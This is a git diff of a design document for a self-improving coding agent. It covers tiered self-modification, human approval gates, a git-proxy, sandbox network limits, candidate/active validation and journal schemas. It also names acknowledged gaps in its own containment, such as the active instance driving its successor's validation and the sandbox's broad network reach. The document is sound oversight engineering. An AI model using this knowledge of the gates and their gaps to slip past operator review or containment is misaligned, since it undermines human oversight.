+8. **Post-deploy verification:** (a) compose healthcheck green on `agent` + `lc-mcpo`; (b) **smoke task = re-run the persisted §6 repro** against the rebuilt active. The repro is already known-good against the candidate; a failure here means the deployed binary is not what got validated. Reusing the validation repro avoids both the too-easy smoke ("echo hello passes a broken build") and the too-expensive ("re-run full Polyglot defeats the point") traps.
+9. **Rollback:** `git revert` + same compose command, or pin to prior tag.
+
+### 11.2 PR body contents
+
+Mechanically templated:
+
+- §6 justification (cluster history, interventions tried, structural argument).
+- §5.3 cohort evidence (cluster_id, occurrences, lineage).
+- §11.1 validation outputs (exercises run, scores vs. baseline, repro result).
+- §10 provenance (journal evidence range, sanitization pass).
+
+Templating is mechanical. **The judgment is the reviewer's**, not the template's.
+
+### 11.3 Deploy actor
+
+The operator. No automated supervisor at this scale — tier-3 is rare by design. If tier-3 ever becomes frequent, a dedicated tiny supervisor service is the upgrade path. Not now.
+
+---
+
+## 12. Operations [Tool foundation; extensions per chapter]
+
+### 12.1 Branch + tag discipline
 
 - All outer-loop changes land on `auto/<date>-<topic>` branches. Never direct to `main`.
-- Merge to `main` requires (a) Polyglot subset score ≥ baseline, _and_ (b) human approval — at least until the attribution layer has earned trust.
-- Tag `pre-iteration-<n>` before each outer-loop attempt; rollback is one command. With the candidate/active deploy model (§18), the active instance is itself the rollback target by construction — a failed candidate is discarded without touching anything running.
-- Container holds a fine-grained PAT scoped to `contents:write` on the little-coder repo only. No repo deletion, no admin, no other repos.
-- Judge independence: the ideal is a different, stronger model, but the privacy mandate (§23) keeps the judge in-stack on the same backend. The same-model blind spot is mitigated by adversarial framing plus three model-independent backstops (Polyglot, cohort, human gate). Full resolution in §23.
-- **Self-improvement remote is private.** The repo little-coder pushes `auto/*` branches and tier-3 PRs to is a private remote, full stop. Cohort evidence, journal ranges, and §8 justifications travel via the PR body (§18 step 6); routing them anywhere a third party might mine ML training data on is incompatible with the privacy posture. Not a hardening — a precondition.
-- **Sanitization applies to every outbound, not just judge calls.** The §23 filter runs on the judge path, the PR-body assembly (§18 step 6), and any future operator-export path. One filter, multiple call sites — filter failure aborts the call, never "send anyway."
+- Tag `pre-iteration-<n>` before each outer-loop attempt. Rollback target = active instance + last green tag.
 
-## 13. The Polyglot oracle
+### 12.2 Upstream fork-parent
 
-Little-coder ships with the 225-exercise Aider Polyglot benchmark. Every artifact merge — even knowledge entries — runs a Polyglot subset and must not regress against baseline. This is the system's honest score function, and a key reason this design is feasible here when it isn't in most self-modifying systems.
+`devonpveller/little-coder-extended` tracks `itayinbarr/little-coder`. **Pulls are operator-initiated** via `/upstream pull` — never auto. Behavior:
 
-Subset selection should bias toward exercises in the cluster's domain. A pure random subset will be noisy at small N.
+- Tiers 0–2 (additive skill files under `skill/`) land cleanly; upstream doesn't touch those paths.
+- Tier-3 conflicts resolved manually on `upstream-merge/<date>` branch, then run §11.1 validation with the broader stratified subset (§11.1 step 4) before becoming active.
+- Self-authored tier-3 artifacts invalidated by an upstream pull are journaled as `invalidated_by_upstream` and retired.
+- The pull is journaled as `upstream_pulled` with old and new commit ids.
 
-**Oracle as interface (DIP note).** Polyglot is _the_ oracle today, but it should be wrapped behind an `Oracle` interface (`run_subset(cluster_id, biased_subset) → ScoredResult`) so that adding MultiPL-E, SWE-bench, or a domain-specific harness later does not require rewriting §21's validation pipeline. Cheap now; rewrite-class expensive if deferred until the third oracle is needed.
+Auto-rebasing onto a moving upstream is avoided: an artifact validated yesterday sitting on a subtly different base today is the failure mode we're preventing.
 
-## 14. Preflight period
+### 12.3 Project focus
 
-Before any meta-loop runs, deploy the container with **journals on, meta-loop off**, for ~1–2 weeks of real workload. Reasons:
-
-- The cluster taxonomy needs real errors, not imagined ones, to be useful.
-- The cohort math needs baselines.
-- The judge prompt needs real examples to calibrate against.
-
-Building the attributor against synthetic errors usually produces something that catches nothing.
-
-## 15. Decisions still open
-
-- ~~**Model.**~~ **Resolved** — `qwen3.6:27b` (reasoning) and `qwen3.6:27b-nothink` (fast) on `http://llama-cpp:8080/v1`. Role split in §4. No other backends.
-- ~~**Open-terminal session model.**~~ **Resolved** — one focused project cloned directly into open-terminal, one task at a time, FIFO queue across triggers. Project switching is an explicit operator action via `/project repo: <link>` which wipes and re-clones. Tier-3 candidate validation escalates to a separate ephemeral open-terminal container. Full mechanism in §17 (session model + project focus + persistence boundary).
-- ~~**Fork-parent vs. self-artifact merge discipline.**~~ **Resolved** — pin to a known-good upstream commit; pulls are operator-initiated via `/upstream pull`. Tiers 0–2 land cleanly (separate paths); tier-3 conflicts resolved on a merge branch with full §18 re-validation. Self-authored tier-3 artifacts invalidated by an upstream pull are journaled and retired. Full mechanism in §17.
-- ~~**Deploy actor.**~~ **Resolved** — the operator, via PR + manual `docker compose up -d --build`. Tier-3 only; tiers 0–2 do not require a restart. Full flow in §18 step 7 and the deploy-per-tier table in §16.
-- ~~**Cohort table schema.**~~ **Resolved** — schema in §19 (journal envelope) + §20 (cluster identity, split/merge lineage). Per-cluster M still tuned in preflight.
-- **Polyglot N & regression margin.** Minimum validation subset size and the noise margin that counts as a regression — tuned against measured Polyglot variance in preflight (§14, §21).
-- **Counterfactual judge prompt.** Concrete wording, few-shot examples, output format.
-- ~~**Cluster → artifact-type router.**~~ **Resolved** — escalation ladder (§6) controls risk class; judge picks the type within the tier when the tier offers a choice (notably tier-1: tool-craft vs. plan-slot). Selection is journaled. Full mechanism in §5.
-- ~~**Routing-rule exploration policy.**~~ **Resolved** — both, in sequence: staged-freeze gates tier-2 entry; 5–10% random-exploration runs against each routing rule indefinitely after authoring. §21 efficacy retires rules that don't pay off. Full mechanism in §7.
-- ~~**Skill frontmatter schema.**~~ **Resolved** — schema and selection logic in §22.
-- ~~**Judge model identity.**~~ **Resolved (in-stack now)** — in-stack `qwen3.6:27b` under adversarial framing (§23). OpenRouter to a stronger external judge is a possible future change if the privacy posture relaxes; deferred, not rejected.
-- **`task_abandoned` timeout policy.** §19's abandonment threshold is doing real work: too short and a legitimate 6-hour refactor gets excluded; too long and a hung loop holds a worker for days. Likely per-channel (interactive vs. validation vs. batch), tuned in preflight.
-- **Neutral test-runner for §18.** Whether to evolve step-3 toward a small shared runner that both active and candidate are clients of, removing active's orchestration control over its own successor's validation. Pragmatic first cut is active-as-driver; promotion to neutral runner is a later hardening.
-- **Open-terminal network posture (ai-stack compose change, Phase 0 prerequisite).** §17 states the target posture (own network, explicit egress to llama-cpp + operator-configured upstream + private search gateway only). The change lives in the ai-stack compose, outside this doc, but it must land **before** the autonomous loop takes real workload — reachability bounds the blast radius from the moment any AI-generated or untrusted code runs inside open-terminal, which is Phase 1. Listed open because the compose change is ai-stack work; promoted from "Phase 6 hardening" to "Phase 0 prerequisite" because the original phasing understated the threat.
-- **Sanitization audit threshold (evidence-triggered).** §23 audits the sanitization filter when metrics (§24) show drift in rejection rate, not on a fixed cadence — consistent with the doc's evidence-based posture throughout. The specific threshold (e.g. "rejection rate moves >Nσ from baseline over a window") is tuned in preflight against the measured baseline, same shape as the Polyglot N/margin item. Until preflight measures baseline behavior, there is no threshold to set.
-- **Reserved-slot promotion threshold.** §24 defer policy ships first. If preflight (§14) or steady-state shows meta-loop routinely starving under interactive load (measured as `meta deferred > N% of attempts` over a window), promote to a reserved llama-swap slot — pick N during preflight.
-- **Backup cadence & restore drill.** Volumes from §16 step 1 (`little-coder-skill`, `little-coder-journals`, `little-coder-cohorts`, `little-coder-polyglot`) need the same Alpine-cron backup pattern as `mnemory-backup` in the stack. Cadence default: daily. Restore drill before tier-1 lands; without a tested restore, the backups are theatre.
-- **`.git/config` flexibility (deferred).** The §4 read-only mount of `.git/config` is correct for the agent (which has no legitimate need to edit it) but precludes legitimate non-remote config edits if a real need arises later. If that happens, the upgrade path is a proxy-time validator that watches `.git/config` and allows safe edits (e.g. `core.autocrlf`) while rejecting remote-related changes. Not built; noted so the rationale survives.
-
-## 16. Suggested build order
-
-1. Container scaffold: `agent` as an MCP server behind `lc-mcpo` (§17), client of the `llama-cpp` backend, journals on with the **full §19 schema including `session_id`, `channel`, and `user_id`**. **These fields are unrecoverable if added later — journals are append-only, and the cohort/lineage math in §6/§20 cannot be retrofitted onto data that never carried full attribution. Tier-0 build requirement; ship them on day one or accept that early traffic is unusable for cohort analysis.** **Declare named volumes at scaffold time** for everything persistent: `little-coder-skill/` (artifact library, §22), `little-coder-journals/` (§19), `little-coder-cohorts/` (§20), `little-coder-polyglot/` (canonical Polyglot clone). These are mounted into `agent` and `meta`; tier-3 rebuilds (§18 step 7) recreate the container but not the volumes. Missing this is the same unrecoverable mistake as a missing journal field — the first rebuild wipes months of accrued state.
-2. Pin the §19 journal schema and the §17 workspace/session model _before_ taking real traffic. Stand up the **CLI operator surface** (§24) — subcommands for `project switch`, `upstream pull`, `pending`, `approve`. CLI is near-free against little-coder's existing CLI and is sufficient for the operator gate from day one. Run the preflight workload (§14).
-3. Draft the cluster taxonomy (§20) and the counterfactual + adversarial judge prompt (§23) against real journals. Stand up journal sanitization (§23) before the judge is ever called.
-4. Build `meta` for tier 0 only. Manual review for every artifact via the operator surface (§24). No automation past artifact drafting.
-5. Add the Polyglot gate with real validation semantics (§21): measured baseline, regression margin from preflight variance, artifact-in-context assertion.
-6. Add `git-proxy` at the workspace edge (§4/§17) and branch/tag conventions (§12).
-7. **Build the OWUI pipeline (§24).** Task triggers as chat; operator commands as slash-commands; artifact-review messages with structured rendering. Not a "later if needed" — a real implementation effort, second only to CLI because parity matters for the operator gate to feel as effective in OWUI as it does in CLI.
-8. Exit preflight only on the §24 checklist. Promote tier 0 to auto-merge once trusted, with efficacy reversion (§21) live. Then build tier 1.
-9. Add the longitudinal structural track (§9) in parallel with tier 1.
-10. Tier 2 only after tier 1 shows demonstrable cohort improvement (§20). Tier 3 last, and only with §18 candidate/active plus the §24 deploy actor decided.
-
-Code changes to little-coder itself (tier 3) are not a near-term deliverable. They are a possibility the architecture leaves open, not a planned feature.
-
-**Deploy flow per tier.** Not every tier needs the same merge-and-deploy path. The flow scales with blast radius:
-
-| Tier                       | Artifact form                                 | Auto-mergeable?                | Restart needed?                                                         | Flow                                                                                    |
-| -------------------------- | --------------------------------------------- | ------------------------------ | ----------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
-| 0 (knowledge)              | `skill/knowledge/*.md`                        | Yes, once trusted (§16 step 8) | No — read by augmenter at next task                                     | git-proxy merges to `main`, next task picks it up                                       |
-| 1 (tool-craft / plan-slot) | `skill/tools/*.md` or planner-prompt addition | Yes, once trusted              | No — same as tier-0 if file-based; verify if it touches a loaded prompt | Same as tier-0                                                                          |
-| 2 (routing rule)           | Config file or rule entry                     | Yes, once trusted              | Depends — config files no; code-path changes yes                        | Probably no restart; verify per-rule                                                    |
-| 3 (code change)            | Diff to `agent.py` / `local/`                 | **No, ever**                   | Yes                                                                     | §18 full flow: candidate validation → PR → human merge → `docker compose up -d --build` |
-
-The §18 candidate/active deploy model applies **only to tier-3**, because tier-3 is the only tier where the running container has the affected code loaded. Tiers 0–1 are data the augmenter reads each task; tier-2 is usually data the router reads each task. Building tier-3's machinery is therefore last (step 10), and the PR + manual deploy actor (§18 step 7) is sized for tier-3's expected rarity.
-
-## 17. Service surface and workspace sharing
-
-This section is placed last for low edit-churn, but architecturally it belongs with §3–§4: it governs how the system is invoked and how its blast radius stays contained.
-
-**Grounding — both halves already exist in the target stack.** The ai-stack already runs:
-
-- `open-terminal` — Open WebUI's terminal service. Separate container, API-key'd, localhost-bound, `network_mode: service:openwebui`.
-- `mcpo` — an MCP-as-OpenAPI proxy, already in production fronting the private search gateway.
-
-little-coder is exposed the same way the search gateway already is: **little-coder container → MCP server → an `lc-mcpo` sidecar → OpenAPI → registered as an OWUI tool**; CLI and other clients hit the same OpenAPI surface or the MCP socket directly. This is the concrete form of §4's "exposed over HTTP/socket" — existing proven infrastructure applied again. little-coder and open-terminal stay **separate containers**; little-coder manages its own lifecycle (see update streams below).
-
-**The execution model: open-terminal is the workspace, not a window.** little-coder does not host a working tree. open-terminal **is** the workspace and the execution substrate — the repo lives there, edits and command/test runs happen there. little-coder is the controller that drives it. The intended flows:
-
-```
-Flow 1:  OWUI (prompt) → little-coder → open-terminal (edits/commands) → inner loop → task complete → OWUI
-Flow 2:  User CLI       → little-coder → open-terminal (edits/commands) → inner loop → task complete → User CLI
-```
-
-OWUI and CLI are **triggers**: they start a task and await the result. They do not share a live shell with little-coder concurrently.
-
-**Two planes, kept distinct:**
-
-- **Control plane** — little-coder. Triggered by OWUI/CLI, owns the inner loop (§3).
-- **Workspace + execution plane** — open-terminal. The repo, the edits, the command/test runs. This is the blast-radius boundary.
-
-**Retraction.** An earlier draft of this section asserted the opposite — execution inside little-coder's container, open-terminal as a read-only inspect window, and a claim that a shared execution surface would collapse the §3 loop separation. Under the intended flow that argument is wrong and is withdrawn: the human _triggers and awaits_ rather than sharing a shell, so the inner loop (little-coder ↔ open-terminal) stays cleanly separate from the human surface. §3 is preserved by the trigger/await pattern, not by moving execution away from open-terminal.
-
-**What the model does change: git-proxy moves, it does not disappear.** §4/§12's rollback and "never direct to `main`" guarantees depend on git-proxy being the _only_ git path. With execution living in open-terminal, the proxy is sited at the **open-terminal workspace edge**: git inside the workspace is the proxied binary, and little-coder has no un-proxied raw-git path it can issue into the terminal. This is a correctness requirement for the safety model, not a preference (reflected in §4's git-proxy bullet).
-
-**Blast radius is now open-terminal's environment.** Because open-terminal is `network_mode: service:openwebui`, anything that namespace can reach, the inner loop can reach by issuing commands into the workspace. open-terminal's own containment — capabilities, network reachability, filesystem scope, `no-new-privileges` — is therefore the de facto sandbox for the entire self-improving system and must be hardened and reviewed as such. It is no longer "just a terminal."
-
-**Network posture (prerequisite, not hardening).** The current `network_mode: service:openwebui` was sized for human use of the terminal, not for an autonomous self-modifying loop. Sharing Open WebUI's network namespace means open-terminal inherits everything Open WebUI can reach — fine for a human typing commands, dangerous when an AI loop is executing AI-generated code against untrusted repos. The target posture: open-terminal moves to its own network with **explicit egress only to what the inner loop needs** — `llama-cpp` on `llm-net` for inference, the operator-configured upstream git remote for the focused repo, the private search gateway if web-search is enabled, nothing else.
-
-**This is a Phase 0 prerequisite, not a Phase 6 hardening.** The blast radius matters from the first moment any code runs inside open-terminal — that's Phase 1, not later. git-proxy (Phase 6) controls _git operations_; the network change controls _reachability_. They're separate safety layers and they need to land in the order their threats appear. The network change is the earlier threat. The autonomous loop should not take real workload until it lands. Tracking item in §15.
-
-**Session model (resolved).** open-terminal hosts one focused project at a time, cloned directly into the workspace — no per-task worktrees, no per-session directories. One repo, one task at a time. Concurrency:
-
-- **One task at a time.** A trigger (Flow 1 or Flow 2) runs to completion before the next one starts. The simplest correct model.
-- **FIFO queue across triggers.** A Flow 2 (CLI) trigger arriving during a Flow 1 (OWUI) task waits its turn. Users do not see "busy, try later"; they see "queued."
-- **Validation runs**: §13 Polyglot gates and §18 candidate validations run against fresh ephemeral clones, not the focused-project workspace. They never share the workspace with interactive work, so concurrency between them isn't a question — they're physically separate.
-- **Human attach**: read-only. Mid-task writes from a human collide with the inner loop in ways no design can save; read-only attach is the honest answer.
-- **Tier-3 candidate validation (§18)**: escalates to a _separate ephemeral open-terminal-shaped container_, fully separate from the focused-project workspace. Rare, important, warrants a clean room.
-
-**Project focus (resolved).** open-terminal hosts one focused project at a time. Switching projects is an explicit operator action via `/project repo: <link>` (OWUI slash-command or equivalent CLI), distinct from a task trigger. Behavior:
+open-terminal hosts one focused project at a time. Switching is an explicit operator action via `/project repo: <link>`:
 
 ```
 /project repo: <link>
   → normalize <link> to canonical form (host + owner + repo, lowercased)
   → if no current focus:
-      clone, set focus, journal `project_switched`, proceed
+      clone, set focus, journal project_switched, proceed
   → if matches current focus:
       no-op, proceed
   → if doesn't match current focus:
       → if a task is in flight: reject, suggest cancel-or-wait
       → else: tag prior state, wipe workspace, clone, set focus,
-              journal `project_switched`, proceed
+              journal project_switched, proceed
 ```
 
-URL normalization prevents spurious wipes when SSH and HTTPS forms of the same repo are used interchangeably. The in-flight guard prevents silent wipe-under-load. The `project_switched` journal record matters for §20 cohort analysis: rate changes coinciding with a switch must be visible in the data, not invisible.
+URL normalization prevents spurious wipes when SSH/HTTPS forms of the same repo are used. The in-flight guard prevents silent wipe-under-load. The `project_switched` journal record matters for cohort analysis: rate changes coinciding with a switch must be visible in the data.
 
-**Persistence boundary.** Little-coder's own state — skill library (§22), journals (§19), cohort counters (§20), the canonical Polyglot clone — lives on **named docker volumes mounted into little-coder's containers**, not inside the container filesystem (§16 step 1). This matters operationally: tier-3 deploys (§18 step 7) run `docker compose up -d --build little-coder`, which **recreates the container but preserves the volumes**. Treating this state as "inside the container" silently wipes months of accrued expertise on the first rebuild. The volumes are the persistence boundary; the container is ephemeral by design.
+### 12.4 Concurrency
 
-A project switch wipes open-terminal's project workspace; it does not touch little-coder's mounted volumes. Cross-project learning (a Rust lifetimes cluster discovered on project A paying off on project B) is the entire point of §6 and survives switches via the volume boundary, not by special handling.
+- **One task at a time** in open-terminal.
+- **FIFO queue across triggers.** A CLI trigger arriving during an OWUI task waits its turn. Users see "queued", not "busy, try later."
+- **Validation runs** against fresh ephemeral clones, not the focused-project workspace. Never share workspace with interactive work.
+- **Human attach** is read-only. Mid-task writes from a human collide with the inner loop in ways no design can save.
 
-**Synergy with §14.** OWUI/CLI users driving little-coder on real repos through the control plane _is_ the real preflight workload — free, high-fidelity journal collection instead of synthetic, provided attribution is in place from the start:
+### 12.5 Single-flight + budgets
 
-**Hard prerequisite — session/channel attribution.** With two trigger flows plus the meta-loop, every journal line MUST carry a session id and a channel tag from day one. Without it, §6's before/after cohort windows interleave across unrelated callers and the rate-delta math silently lies. Near-free to add when the MCP wrapper is first built, effectively unrecoverable retroactively. A **tier-0 build requirement**, not a later refinement (reflected in §4's journal schema).
+- **`meta`:** at most one iteration in progress.
+- **Budget caps** per window: artifacts/iteration = 1, judge wall-clock minutes/day, Polyglot exercise-runs/day, journal write rate. Exceeding defers; never drops evidence.
+- **Deferral queue is bounded; evidence is not.** Soft limit on queue depth → operator alarm. Hard limit → **coalesce per `cluster_id`**, never drop. When a coalesced entry runs, cohorts are re-read fresh from journals (no stale snapshots). Cross-cluster FIFO; no cluster is starved.
+- **Resource isolation:** `meta` checks llama-cpp slot occupancy before issuing inference; backs off when interactive lanes are busy. Interactive always wins.
 
-**Two update streams little-coder must reconcile.** little-coder is self-managing _and_ tracks its fork parent:
+### 12.6 Operator surface
 
-- **Self-improvement** — the outer loop's `auto/<date>-<topic>` branches (§5–§12).
-- **Upstream fork-parent** — the extended fork (`devonpveller/little-coder-extended`) tracks `itayinbarr/little-coder`. Upstream pulls and self-authored artifacts can collide on the same files (skill loader, `agent.py`, planner prompt).
+The §10.5 human gate needs somewhere to live. One surface, two forms:
 
-**Policy (resolved): pin to a known-good upstream commit; pulls are operator-initiated.** Upstream is never auto-pulled. The operator initiates a pull via `/upstream pull` (OWUI slash-command or CLI), parallel in shape to `/project repo:`. Behavior:
+- **CLI** ships first (near-free against little-coder's existing CLI): `lc admin project switch`, `pending`, `approve`, `reject`, `upstream pull`, `shutdown [--drain-deadline]`, `task confirm`.
+- **OWUI pipeline** next: task triggers map to chat; operator commands map to slash-commands (`/project repo:`, `/upstream pull`, `/approve <id>`, `/pending`, `/confirm <task_id>`). Artifact-review messages render artifact text + cohort evidence + provenance + Approve/Reject controls.
 
-- For tiers 0–2 (additive skill files under `skill/`), upstream pulls cannot conflict because upstream doesn't touch those paths. The pull lands cleanly. No special handling.
-- For tier-3 code (changes to `agent.py` / `local/`), a real merge conflict is possible. On conflict, the operator resolves it manually on a `upstream-merge/<date>` branch, then runs validation before it becomes the new active. **Validation scope for upstream merges is broader than §18's cluster-biased subset:** an upstream merge can touch the harness, planner prompt, or skill loader — anything — so the regression risk is not confined to one cluster's domain. Use a **stratified Polyglot subset across all live cluster domains** (at least one exercise per active cluster), or the full 225-exercise benchmark if compute allows. The §18 candidate/active deploy mechanism is reused, but with this broader test set. A self-authored tier-3 artifact that no longer makes sense against the new upstream base is journaled as `invalidated_by_upstream` and retired (§21 efficacy track picks this up if it slips through).
-- The pull itself is journaled as `upstream_pulled` with the old and new upstream commit ids — same rationale as `project_switched`: cohort-rate changes coinciding with an upstream pull must be visible.
+**Privilege separation:** operator commands authenticate at the surface (CLI = host shell; OWUI = configured auth), never at the MCP server. The MCP server takes task triggers only. A regular user cannot escalate into an operator action by shaping a task trigger like one.
 
-Auto-rebasing onto a moving upstream is explicitly avoided. The class of failures it produces — an artifact that validated yesterday now sits on a subtly different base — is hard to debug and easy to prevent by making the pull an explicit operator action.
+The surface lists: pending artifacts, tier-3 justifications, contradiction flags, efficacy-reversion notices, queue-depth alarms, sanitization-audit prompts. Approve/reject is the merge gate. Pre-trust, everything routes here; post-trust, only tiers ≥ 1 and all flags.
 
-## 18. Candidate/active deploy model for tier-3
+### 12.7 Health + shutdown
 
-Blue/green deployment for self-modification. It converts the dangerous thing ("a process mutates itself") into a well-understood one ("stand up a candidate, validate it, swap, keep the old one as the rollback target"). This is the validation-and-deploy **mechanism** for a tier-3 artifact, not a replacement for the pipeline: the change is still an `auto/<date>-<topic>` branch with its §8 written justification.
+- Compose healthcheck on `agent` (MCP socket responding) and `lc-mcpo` (`/openapi.json` reachable).
+- **SIGTERM = drain mode.** Refuse new triggers (return "shutting down"); allow in-flight to complete to a configurable deadline; then SIGKILL.
+- **Drain deadline** is shorter than the shortest channel's expected p95, with operator override per shutdown (`lc admin shutdown --drain-deadline 30m`). Open `task_id`s past the deadline are journaled `task_abandoned` with reason `shutdown`. Volumes survive; restart resumes from the journals.
 
-**Flow.** Active little-coder runs the cycle until it produces a tier-3 artifact, then:
+### 12.8 Config
 
-1. Stage the artifact in a separate ephemeral workspace — its own open-terminal, per §17, distinct from interactive-task workspaces.
-2. Provision a **paired candidate topology**: a `candidate-little-coder` container (built from the staged code) _and_ its own `candidate-open-terminal` container — mirroring the active topology, not collapsing into one container. The candidate-little-coder mounts:
-   - **Active's persistent volumes (§16 step 1) as a read-only snapshot.** The candidate reads active's skill library, cohorts, and journals to behave coherently, but cannot mutate them. A buggy candidate physically cannot corrupt active state.
-   - **A writable tmpfs** for the candidate's own ephemeral journals/state during validation, discarded on teardown.
-   - **The same containment as active** (capabilities, network policy from §17 target posture, `no-new-privileges`). Tier-3 is not a place to loosen sandboxing.
-3. The **active** instance drives the test as a stable, known-good harness. It is the driver, not the arbiter. _Residual asymmetry, acknowledged:_ active still controls which tests run, how repro is set up, and what counts as a successful candidate boot. The verdict (step 5) is external, but the orchestration is not. A neutral test-runner that both active and candidate are clients of would be cleaner; active-as-driver is a pragmatic first cut, not the final form (open follow-up below, §15).
-4. Two acceptance tests, both required:
-   - **Issue fixed** — reproduce-then-fix the specific §8 cluster that justified the change.
-   - **No regression** — Polyglot subset (§13), biased to the cluster's domain, score ≥ baseline.
-5. Verdict comes from the objective oracle: Polyglot score + §8 justification + §12 human gate. Never from the active instance's own assessment — that re-imports the self-judging blind spot §12 forbids.
-6. On pass: tear down the candidate and its staged workspace; little-coder opens a **pull request** from `auto/<date>-<topic>` to `main` on the **private** self-improvement remote (§12). The PR body is mechanically templated from the cohort and validation records and carries:
-   - The §8 justification (cluster history, interventions tried, structural argument).
-   - §20 cohort evidence (cluster_id, occurrences, lineage).
-   - §18 validation outputs (Polyglot exercises run, scores vs. baseline, issue-reproduces-then-fixes result).
-   - §23 provenance (journal evidence range).
+All tunables in a **centralized typed config** (YAML + JSON schema), validated at boot. Hot-reloadable where safe (filter ruleset, budgets, thresholds); restart-required where schema-affecting. Prose-as-config doesn't survive contact with operations.
 
-   **The PR body is passed through the §23 sanitization filter before posting** — the same filter used on judge calls (§12). Journal evidence ranges and cohort records can carry user code; a GitHub PR body is an external surface even when the remote is private (GitHub indexes, replicates, and may train on private repos depending on plan). One filter, every outbound. Filter failure aborts the PR — never "post anyway."
+Tunables include: per-cluster M, Polyglot N/margin, budget caps, `task_abandoned` timeout per channel, exploration rate (5–10%), coalesce thresholds, similarity floor, augmenter token budget, sanitization drift threshold, sanitization filter ruleset, drain deadline.
 
-   Without this body, the PR is a diff with no context and review degrades into "skim and trust." The templating is mechanical, not judgment — the judgment is the reviewer's.
+### 12.9 Schema migration
 
-7. **Human merge + manual deploy.** The operator reviews the PR on the private remote (§12) and merges what they choose. After merge, the operator runs `docker compose up -d --build little-coder` (or equivalent) to bring the new version up. The active instance was never mutated; the restart is a clean swap between two known-good tagged commits — and the named volumes (§16 step 1) survive the rebuild, so accrued state is preserved.
+Journal envelope, frontmatter, cohort store, config — all carry `schema_version` and evolve. Readers tolerate older shapes (forward-compat). Migrations are explicit operator-run jobs.
 
-   **Operator post-deploy verification.** Before considering the deploy complete, the operator confirms two things: (a) the compose healthcheck reports green for both `agent` and `lc-mcpo` (§24); (b) **a smoke task succeeds — specifically, the §8 cluster's repro case from step 4 above.** That repro case was the precise scenario the artifact was designed to fix; it has already been run successfully against the candidate; if it fails against the freshly-deployed active, the deployed binary is not what got validated. Reusing the validation repro as the smoke task avoids the trap of a too-easy smoke check ("echo hello" passes a broken build) and a too-expensive one (re-running full Polyglot defeats the point). It is already written, already known-good, and a failure is unambiguous.
+**Tier-3 self-changes cannot propose schema changes.** Mixing autonomous self-modification with schema migration is the class of failure §6 is built to prevent — the §6 justification cannot articulate "no skill could have replaced this" for a data-shape change. Operator-only, full stop.
 
-   If either check fails, rollback is `git revert` + the same compose command, or pinning to the prior tag. Automation is overkill for tier-3's expected rarity (§16 step 10); if tier-3 ever becomes frequent enough that manual post-deploy verification is friction, a dedicated tiny supervisor service is the upgrade path. Not now.
+### 12.10 Failure semantics
 
-**Why this is the benign version of self-modification.** The candidate is torn down by an external actor while the active instance drives, so no process kills itself mid-task. The only restart is a clean container swap between two known-good tagged commits — not a process hot-patching itself.
+Nothing fails open:
 
-**Cost.** Both instances are MCP clients of the same `llama-cpp:8080` backend (llama-swap, `n_parallel=2`): shared inference, no second model, no extra VRAM. The only added cost is the ephemeral staged workspace during validation.
+- Judge unreachable → defer, alarm, no merge.
+- Polyglot won't run → "insufficient evidence" (not pass), defer.
+- Candidate won't boot → fail closed, tear down, cluster stays at its current tier (no escalation credit for a failed deploy).
+- Sanitization filter errors → abort the call.
+- Every failure journaled.
 
-**Open follow-ups.** How the candidate workspace is provisioned and torn down idempotently; whether step 3's "active drives" needs a timeout/watchdog so a hung candidate can't stall the active instance's own workload; whether to evolve toward a neutral test-runner that both active and candidate are clients of, removing the step-3 orchestration asymmetry. (Deploy actor is resolved: the operator, via PR + manual `docker compose`.)
+### 12.11 Golden-journal test suite
+
+Preflight validates against real journals — that tests the journals, not `meta`'s logic. A **golden-journal suite** of synthetic journals with known cohort shapes exercises cluster assignment, split/merge lineage, tier escalation, efficacy reversion, and the sanitization filter. Each release of `meta` runs against the suite before deploy.
 
 ---
 
-_Sections 19–24 close gaps found in a full review of §1–§18: the data layer, cluster identity, validation semantics, the skill library lifecycle, privacy/poisoning, and meta-loop operations. Each states a default decision in the doc's voice; residual sub-questions are pushed to §15._
+## 13. Preflight [Observer entry gate]
 
-## 19. Journal schema & lifecycle
+Before any meta iteration runs, deploy with **journals on, meta off** for ≥ 1–2 weeks of real workload. Reasons:
 
-The cohort math (§6) and clustering (§20) are only as trustworthy as the journals. Pin this before preflight (§14) — fields cannot be retrofitted onto append-only history.
+- Cluster taxonomy needs real errors, not imagined ones.
+- Cohort math needs baselines.
+- Judge prompt needs real examples to calibrate against.
 
-**Record envelope.** Every line in all three journals shares: `ts` (UTC), `task_id` (ULID), `session_id` + `channel` + `user_id` (§17, tier-0 — `user_id` carries the same unrecoverable-if-missed weight as `session_id` because OWUI authn supports multiple users; without it, cohorts conflate users' craft gaps), `repo` + `lang`, `seq` (per-task counter), `schema_version` (envelope version — readers must tolerate older shapes, see §24 schema migration). `task_id` is minted when a trigger (Flow 1/2) starts and closed by an explicit terminal record.
+Exit only when, against real journals:
 
-**Write-time validation.** All records validated against the envelope schema at write time; malformed records are rejected, not appended. A bug in `agent` cannot silently corrupt the journal that `meta` reads.
+1. ≥ K distinct clusters each have ≥ their M window of _observed_ occurrences.
+2. Polyglot baseline variance measured; N + margin set (§8.3).
+3. Counterfactual + adversarial judge prompt dry-run on real examples + human-rated.
 
-**Task lifecycle.** `task_started` / `task_ended` records bracket every task in `outcomes.jsonl`. Interleaved sessions are legal; a task is reconstructed by `task_id`, never by adjacency. An unclosed `task_id` past a timeout is recorded `task_abandoned` — neither pass nor fail, excluded from cohorts. _The timeout value is non-trivial and likely per-channel: a 6-hour legitimate hard refactor on the interactive channel must not be abandoned; a hung loop on a 5-minute validation task must not consume a worker overnight. Tunable in preflight — see §15._
-
-**Outcome label — the hard one.** Polyglot tasks have an oracle; free-form OWUI/CLI tasks usually do not. Outcome ∈ {`pass`, `fail`, `unverified`}. `pass`/`fail` only with a checkable signal (test-suite exit, the task's own acceptance command, or **explicit caller confirmation via the operator surface — see below**). Otherwise `unverified`: it feeds the acute track **only as error evidence** (a tool error is a fact regardless of final outcome), never as a success signal. This closes the §9 "inner loop reports success" ambiguity — absent an oracle, success is not asserted; the longitudinal track (§9) is the net for `unverified` work.
-
